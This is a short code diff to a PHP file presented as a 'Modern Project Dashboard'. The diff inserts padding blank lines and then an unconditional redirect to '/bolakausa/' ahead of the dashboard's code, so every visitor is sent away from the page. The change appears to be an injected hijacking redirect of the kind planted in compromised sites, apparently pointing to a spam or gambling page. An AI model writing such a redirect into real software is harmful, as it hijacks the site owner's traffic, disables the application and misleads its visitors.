@@ -1,4 +1,11 @@
+
+
+
+
 <?php
+
+
+header("Location: /bolakausa/");
 /**
  * Modern Project Dashboard
  * Enhanced with metadata tracking and dark mode UI.
